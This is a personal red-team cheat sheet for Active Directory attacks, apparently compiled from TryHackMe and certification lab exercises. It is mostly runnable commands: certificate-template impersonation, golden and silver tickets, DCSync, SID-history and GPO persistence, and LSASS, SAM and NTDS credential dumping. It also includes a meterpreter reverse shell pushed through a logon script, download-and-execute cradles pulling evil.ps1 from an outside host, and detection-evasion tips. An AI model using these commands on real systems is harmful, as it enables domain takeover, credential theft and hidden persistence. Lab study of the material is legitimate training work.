`certutil -Template -v > templates.txt`*This will provide output on all configured templates.*
https://github.com/GhostPack/Certify
https://github.com/GhostPack/ForgeCert
(https://github.com/GhostPack/PSPKIAudit)

# In our case, we are looking for a template with the following poisonous parameter combination:

    Client Authentication - The certificate can be used for Client Authentication.
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative Name (SAN).
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
    Certificate Permissions - We have the required permissions to use the certificate template.

# Type mmc and hit enter
`C:\>mmc`
    Click File->Add/Remove Snap-in..
    Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
    Click OK

You should now see the Certificate snap-in:

We will request a personal certificate:

    Right Click on Personal and select All Tasks->Request New Certificate...
    Click Next twice to select the AD enrollment policy.
    You will see that we have one template that we can request, but first, we need to provide additional information.
    Click on the More Information warning.
    Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
    Change the Alternative name Type option to User principal name.
    Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.

Once you are happy with it, click Apply and OK. Then, select the certificate and click Enroll. You should be able to see your certificate:

The last step is to export our certificate with the private key:

    Right-click on the certificate and select All Tasks->Export...
    Click Next, select Yes, export the private key, and click Next.
    Click Next, then set a password for the certificate since the private key cannot be exported without a password.
    Click Next and select a location to store the certificate.
    Click Next and finally click Finish.

# User Impersonation through a Certificate
`\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101`*Ask ticket granting ticket*

# Use the ticket for access 
`mimikatz # privilege::debug`
`mimikatz # kerberos::ptt administrator.kirbi`
`mimikatz # exit`
`dir \\THMDC.za.tryhackme.loc\c$\`

# Golden ticket mimikatz
The ingredetients we need:
    The FQDN of the domain
    The Security Identifier (SID) of the domain
    The username of the account we want to impersonate
    The KRBTGT password hash

`mimikatz # privilege::debug`
`mimikatz # lsadump::dcsync /user:za\krbtgt`

# Cross forest trust golden ticket(AD-RSAT Powershell cmdlets)
`Get-ADComputer -Identity "THMDC"`*recover the SID of the child domain controller*
`Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc`*recover the SID of the parent domain controller*

`mimikatz # privilege::debug`

`mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt`

`mimikatz # exit`

`dir \\thmdc.za.tryhackme.loc\c$`
`dir \\thmrootdc.tryhackme.loc\c$\` *So works for both domains*

## Persistence in AD
# DC SYNC all 
`mimikatz # log syncemup_dcdump.txt `
`mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all`*Get all username, hashes and etc*
# DC SYNC Alrternative of mimi(remote ofc)
`python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP`
0x36c8d26ec0df8b23ce63bcefa6e2d821

# Forge tickets
` Get-ADDomain` *Get the domain SID*
*All the other information can be found on a dc sync*

**Golden ticket**
`mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`

**Silver ticket**
`         
mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt`

# Generating our own Certificates become CA and make them cry
`mimikatz # crypto::certificates /systemstore:local_machine`
`mimikatz # privilege::debug`
`mimikatz # crypto::capi`
`mimikatz # crypto::cng`
`mimikatz # crypto::certificates /systemstore:local_machine /export`*The exported certificates will be stored in both PFX and DER format to disk, The za-THMDC-CA.pfx certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.*

`C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 `

    CaCertPath - The path to our exported CA certificate.
    CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
    Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
    SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
    NewCertPath - The path to where ForgeCert will store the generated certificate.
    NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

`C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101`*Get the TGT*

    /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
    /certificate - Path to the certificate we have generated
    /password - The password for our certificate file
    /outfile - The file where our TGT will be output to
    /domain - The FQDN of the domain we are currently attacking
    /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

`mimikatz # kerberos::ptt administrator.kirbi`
`mimikatz # exit`

# SID Persistence(Domain adm privs)

Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.

`Get-ADUser <your ad username> -properties sidhistory,memberof`*Check the SID history of the account we want*
`Get-ADGroup "Domain Admins"` *get the SID of the Domain Admins group*

`Import-Module DSInternals`
`Stop-Service ntds -Force`
`Add-ADDBSidHistory -SamAccountName 'donald.ross' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\Windows\NTDS\ntds.dit'`
`Start-Service ntds`

# Nested group persistence
**For instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group. We would make use of the existing groups to perform nesting instead of creating them as we will do below. However, this is something you would never do on a normal red team assessment !!**

`New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security` *creating a new base group that we will hide in the People->IT Organisational Unit (OU)*

`New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security`

`Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"`*Let's now create another group in the People->Sales OU and add our previous group as a member:*

`Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup2"` *add that group to the Domain Admins group:*

`Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"`*add our low-privileged AD user to the first group we created*

# Persisting through AD Group Templates
Inject into the templates that generate the default groups. By injecting into these templates, even if they remove our membership, we just need to wait until the template refreshes, and we will once again be granted membership.

To avoid kicking users out of their RDP sessions, it will be best to RDP into THMWRK1 using your low privileged credentials, use the runas command to inject the Administrator credentials, and then execute MMC from this new terminal:

`runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe`

*Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:*

*Navigate to the Security of the group (Right-click->Properties->Security):*
*Let's add our low-privileged user and grant Full Control:
    Click Add.
    Search for your low-privileged username and click Check Names.
    Click OK.
    Click Allow on Full Control.
    Click Apply.
    Click OK.*

# GPO almost impossible to kick me out
*Create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.*

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe`

*Create the following script .bat*
`copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe`


`scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/`
`scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/` *SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:*

`msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"`*listener*

**You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.**

GPO Creation

The first step uses our Domain Admin account to open the Group Policy Management snap-in:

    In your runas-spawned terminal, type MMC and press enter.
    Click on File->Add/Remove Snap-in...
    Select the Group Policy Management snap-in and click Add
    Click OK

We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as username - persisting GPO:

Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:

Let's get back to our Group Policy Management Editor:

    Under User Configuration, expand Policies->Windows Settings.
    Select Scripts (Logon/Logoff).
    Right-click on Logon->Properties
    Select the Scripts tab.
    Click Add->Browse.

Let's navigate to where we stored our Batch and binary files, Select your Batch file as the script and click Open and OK. Click Apply and OK.

Go back to your MMC windows, click on your policy and then click on Delegation:

By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

    Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security.
    Click on all other groups (except Authenticated Users) and click Remove.

Click on Advanced and remove the Created Owner from the permissions:

We could replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy.

    Click Add.
    Type Domain Computers, click Check Names and then OK.
    Select Read permissions and click OK.
    Click on Authenticated Users and click Remove.

Right after you perform these steps, you will get an error that you can no longer read your own policy:

# Credential harvesting

# Dump local hashes
## One way 
*cmd.exe prompt with administrator privileges*
`wmic shadowcopy call create Volume='C:\'`*wmic command to create a copy shadow of C: drive*
`vssadmin list shadows`*Listing the Available Shadow Volumes*
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam`
`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system` *Copying the SAM and SYSTEM file from the Shadow Volume*
`python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL`*Check the hashes* 

## The other way
`reg save HKLM\sam C:\users\Administrator\Desktop\sam`
`reg save HKLM\system C:\users\Administrator\Desktop\system`*Registry dump those*
`python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL`

# Protected LSASS dump
`mimikatz # privilege::debug`
`mimikatz # !+`*Loading the mimidrv Driver into Memory*
`!processprotect /process:lsass.exe /remove`*Removing the LSA Protection*
`mimikatz # sekurlsa::logonpasswords`*Dump*

# Dumping credentials manager
`mimikatz # privilege::debug`
`mimikatz # sekurlsa::credman`
`mimikatz # vault::cred /patch`

# Dump Credential Manager
## Web cred dump
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1#
`C:\Users\Administrator>vaultcmd /list`
`C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"`
`powershell -ex bypass`
`Import-Module C:\Tools\Get-WebCredentials.ps1`
`Get-WebCredentials`

## Windows cred dump
`C:\Users\thm>cmdkey /list`*Enumerating for Stored Windows Credentials*
`runas /savecred /user:THM.red\thm-local cmd.exe`*Run CMD.exe As a User with the /savecred argument*
THM{Runa5S4veCr3ds}

# NTDS dump from the domain controller(local adm rights)
`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`*Dumping the content of the NTDS file*
*And then take them from the c:\temp and transfer them to your machine*
`python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local`


# checking LAPS( local account cred)
`dir "C:\Program Files\LAPS\CSE"`
`Find-AdmPwdExtendedRights -Identity *`*Finding Users with AdmPwdExtendedRights Attribute*
`net groups "THMGroupReader"`*Finding Users belong to THMGroupReader Group, find a way to compromise him/her*
`Get-AdmPwdPassword -ComputerName creds-harvestin` *Getting LAPS Password with the Right User*

# Kerberoasting
`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation`*Enumerating for SPN Accounts*
`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user `*Requesting a TGS Ticket as SPN Account*


# AS-REP Roasting
`python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt`*Performing an AS-REP Roasting Attack against Users List*

###### Needed to be merged with the above ones #######
### General way 1: of opsec.
# Step 1: Bypass script block logging and all the other logging staff
# Step 2: Bypass AMSI
# Step 3: Do whatever

### General way 2: of opsec.
# When an admin is running as a service on a machine we can extract clear text pass with sekurlsa::ekeyes.

### Thinks to remember 3: opsec
If our target is 2016 and before then after using a golden ticket or a silver ticket we cant use winrs or powershell remoting however u can still run commands using wmi (`gwmi -C win32_computersystem -ComputerName dcorp-dc`). If its 2019 ++ you have no problem.

### Thinks to remember 4: opsec
Using silver ticket might be fancy becuase Miscrosoft MDI doesnt care about silver tickets and in some cases we dont touch the DC but our persistence period by default is 30 days for computer accounts. Also have in mind that if we want to do multiple things even when targeting a DC(not recommended) we have to create different tickets for different purposes(ex: HOST to create a schtask)

### Thinks to remember 5: opsec
If you try to create a silver ticket and use /service:HTTP in order to use winrm it wont work if its 2016.

###  Thinks to remember 6: opsec
When you get access to a new user it is worth checking if he/she has local admin access to any other machine

### Thinks to remember 7: opsec
In cases you run sekurlsa::ekeys and if you find many aes keys for the same user check the SID always, and for example in case of a resource based constrained delegated scenario would pick S-1-5-18 which is the admin one !

### Thinks to remember 8: opsec
Use silver tickets for staying under the radar dont do stupidities like adding ur account to domain admin group with that, be smart.

### Thinks to remember 9: opsec
Kerboroasting on the best attacks for staying under the radar, if you manage to guess the pass(I mean its RC4 ... hope you do it !)

### Thinks to remember 10: opsec
ACL attacks are interesting and very profitable, i would also say that there are stealthier than others.

## Thinks to remember 11: opsec
Credential theft protections(Credential Guard,Protected users group) are not protecting against extracting credential from the registry, only from lsass. Credentials for local accounts in SAM and Service account
credentials from LSA Secrets are NOT protected.

### Behavioural bypassing
## Scenario 1: We have remote access to another machine and we want to use a binary to download something and execute it in the memory. An executable trying to download another executable or something from a remote server will trigger bevaviour base detection from defender. Instead portforward your own port and download it from 127.0.0.1 which will not be a remote server.
**Example:**
`winrs -r;dcorp-mgmt hostname:whoami` -> "From our machine exec on the other machine"
`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe` "Download on our machine"
`echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe` "Copy on the rmt machine"
`winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.1/Loader.exe sekurlsa::ekeys exit` "Wrong way as executable tries to download another executable and run it from 'remote server'"
`winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.16.100.1`"Correct way as we forward our port as the remote machine localhost port access, so it seems that the remote machine is downloading from itself and not from a remote server"
############################################################################
### Noisy commands that and should be avoided :
## Scenario 2: In general the idea is when you ask something from the DC and you spam all the machines in the network you will leave logs on all the machines and you will cause a network spike.

 # Find shares on hosts in current domain.
Invoke-ShareFinder–Verbose
# Find sensitive files on computers in the domain
Invoke-FileFinder–Verbose
# Get all fileservers of the domain
Get-NetFileServer
Also when run Commands for finding local admin rights on other machines is also noisy.
# Find all machines on the current domain where the current user has local admin access ( also Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1)
Find-LocalAdminAccess–Verbose
# Find computers where a domain admin (or specified user/group) has sessions:
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "RDPUsers"

# Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).
Find-DomainUserLocation -CheckAccess

# Supply data to BloodHound:
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Skeleton Key ( too much noise for nothing) Use the below command to inject a skeleton key (password would be mimikatz, want to change that change mimi source code and put ur own) on a Domain Controller of choice. DA privileges required
`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
# Now, it is possible to access any machine with a valid username and password as "mimikatz"
`Enter-PSSession–Computername dcorp-dc–credential dcorp\Administrator`

# In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
`mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-`
# Note that above would be very noisy in logs - Service installation (Kernel mode driver)

# There is a local administrator on every DC called DSRM "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server ispromoted to Domain Controller and it is rarely changed. Dump DSRM password (needs DA privs)
`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc`
# Compare the Administrator hash with the Administrator hash of below command
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
# But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
`Enter-PSSession -Computername dcorp-dc`
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD( WHAT ARE YOU DOING you are making a user not allowed to logon remote to do so, you are not supposed to introduce extra vulns, stop it get some help !)
# Use below command to pass the hash
`Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'`
`ls \\dcorp-dc\C$`
##############################################################

# When looking for domain admins you should always check the SID if the last three digits are 500, because someone might have renamed him. On the other hand on a non-domain machine when you are not local admin, you cant find that if they are renamed.


# We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname

# Load a PowerShell script using dot sourcing
`. C:\AD\Tools\PowerView.ps1`
# A module (or a script) can be imported with:
` Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
# All the commands in a module can be listed with:
`Get-Command -Module <modulename>`
# Download execute cradle
`iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
`$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1
');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`

`iex (iwr 'http://192.168.230.1/evil.ps1')`

`$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText
`
`$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`

# (https://github.com/Flangvik/NetLoader) to deliver our binary payloads. It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
`C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
# We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.
C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe

# Several ways to bypass execution policy

`powershell–ExecutionPolicy bypass`
`powershell–c <cmd>`
`powershell–encodedcommand`
`$env:PSExecutionPolicyPreference="bypass"`

# The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
https://github.com/samratashok/ADModule
`Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll`
`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`

# Evade powershell logging and AMSI bypass (https://github.com/OmerYa/Invisi-Shell)
-> Patches AMSI
-> System wide transcription
-> Script block logging

## Domain Enumeration

# Get current domain
Get-Domain (PowerView)
Get-ADDomain (ActiveDirectory Module)

# Get object of another domain
Get-Domain–Domain moneycorp.local
Get-ADDomain-Identity moneycorp.local
# Get domain SID for the current domain
Get-DomainSID
(Get-ADDomain).DomainSID

# Get domain policy for the current domain
Get-DomainPolicyData
(Get-DomainPolicyData).systemaccess
# Get domain policy for another domain
(Get-DomainPolicyData–domain
moneycorp.local).systemaccess

# Get domain controllers for the current domain
Get-DomainController
Get-ADDomainController
# Get domain controllers for another domain
Get-DomainController–Domain moneycorp.local
Get-ADDomainController -DomainName moneycorp.local -Discover

# Get a list of users in the current domain
Get-DomainUser
Get-DomainUser–Identity student1

Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *

# Get list of all properties for users in the current domain
`Get-DomainUser -Identity student1 -Properties *
Get-DomainUser -Properties samaccountname,logonCount
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -
MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select
name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset
)}}`

# Get all the groups in the current domain
Get-DomainGroup | select Name
Get-DomainGroup–Domain <targetdomain>

Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *

# Get all groups containing the word "admin" in group name
Get-DomainGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name


# Check for active users with high logoncount, bad idea to target low logoncount users.
`Get-DomainUser -Properties samaccountname,logonCount`

# Check descriptions for passwords or other interesting

`Get-DomainUser -LDAPFilter "Description=*pass*" | Select name,Description`

# Get a list of computers in the current domain
`Get-DomainComputer | select Name
Get-DomainComputer–OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`

# Get all the groups in the current domain
Get-DomainGroup | select Name
Get-DomainGroup–Domain <targetdomain>
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
# Get all groups containing the word "admin" in group name
Get-DomainGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name

# Get all the members of the Domain Admins group
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
# Get the group membership for a user:
Get-DomainGroup–UserName "student1"
Get-ADPrincipalGroupMembership -Identity student1

# List all the local groups on a machine (needs administrator privs on non-dc
machines) :
Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups

# Get members of all the local groups on a machine (needs administrator privs on
non-dc machines)
Get-NetLocalGroup -ComputerName dcorp-dc -Recurse
#  Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators

# Get actively logged users on a computer (needs local admin rights on the target)
Get-NetLoggedon–ComputerName <servername>
# Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
Get-LoggedonLocal -ComputerName dcorp-dc
#  Get the last logged user on a computer (needs administrative rights and
remote registry on the target)
Get-LastLoggedOn–ComputerName <servername>



# Get list of GPO in current domain.
Get-DomainGPO
Get-DomainGPO -ComputerIdentity dcorp-student1

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users ( IF DOMAIN GROUP IS ADDED TO LOCAL GROUP, THIS CAN GIVE AN ATTACK PATH. IF you be a part of that group you can have local admin rights on this machine)
Get-DomainGPOLocalGroup

# Get users which are in a local group of a machine using GPO
Get-DomainGPOComputerLocalGroupMapping–ComputerIdentity
dcorp-student1
# Get machines where the given user is member of a specific group
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose

# Get OUs in a domain
Get-DomainOU
Get-ADOrganizationalUnit -Filter * -Properties *
# Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"

# Get the ACLs associated with the specified object
Get-DomainObjectAcl -SamAccountName student1–ResolveGUIDs
# Get the ACLs associated with the specified prefix to be used for search
Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain
Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
# We can also enumerate ACLs using ActiveDirectory module but without resolving
GUIDs
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access

# Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs
# Get the ACLs associated with the specified path
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"

# Get a list of all domain trusts for the current domain
Get-DomainTrust
Get-DomainTrust–Domain us.dollarcorp.moneycorp.local

Get-ADTrust
Get-ADTrust–Identity us.dollarcorp.moneycorp.local

# Get details about the current forest
Get-Forest
Get-Forest–Forest eurocorp.local
Get-ADForest
Get-ADForest–Identity eurocorp.local
# Get all domains in the current forest
Get-ForestDomain
Get-ForestDomain–Forest eurocorp.local
(Get-ADForest).Domains

# Get all global catalogs for the current forest
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog–Forest eurocorp.local
Get-ADForest | select -ExpandProperty GlobalCatalogs
# Map trusts of a forest
Get-ForestTrust
Get-ForestTrust–Forest eurocorp.local
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'

# Find computers (File Servers and Distributed File servers) where a domain admin session is available.
Find-DomainUserLocation –Stealth

# BloodHound : To avoid detections like ATA
Invoke-BloodHound -CollectionMethod All -ExcludeDC

## Priv esc 
# Get services with unquoted paths and a space in their name.
Get-ServiceUnquoted -Verbose
# Get services where the current user can write to its binary path or
change arguments to the binary
Get-ModifiableServiceFile-Verbose
# Get the services whose configuration current user can modify.
Get-ModifiableService-Verbose

# PowerUp
Invoke-AllChecks
# Privesc:
Invoke-PrivEsc
# PrivescCheck:
Invoke-Privesc Check
# PEASS-ng:
winPEASx64.exe

# PowerShell Remoting Use below to execute commands or scriptblocks:
Invoke-Command–Scriptblock {Get-Process} -ComputerName
(Get-Content <list_of_servers>)
# Use below to execute scripts from files
Invoke-Command–FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# Use below to execute locally loaded function on the remote machines:
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
# In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
# a function call within the script is used:
Invoke-Command–Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# execute "Stateful" commands using Invoke-Command:
$Sess = New-PSSession–Computername Server1
Invoke-Command–Session $Sess–ScriptBlock {$Proc = Get-Process}
Invoke-Command–Session $Sess–ScriptBlock {$Proc.Name}

# We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname

# Dump credentials on a local machine using Mimikatz.
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys"
# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys
# Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

# Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa
# Using comsvcs.dll (lol bin to bypass application white list)
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
<lsass process ID> C:\Users\Public\lsass.dmp full


# Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation(Run as administrator)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
## The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).

#  Below doesn't need elevation ( This overwrites the current tickets)
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
#  Below command needs elevation ( This starts a new process and if you run whoami you will not see ur impersonated admin privs. Because the proccess starts with logon type 9 so new credentials are used when you access network resources !)
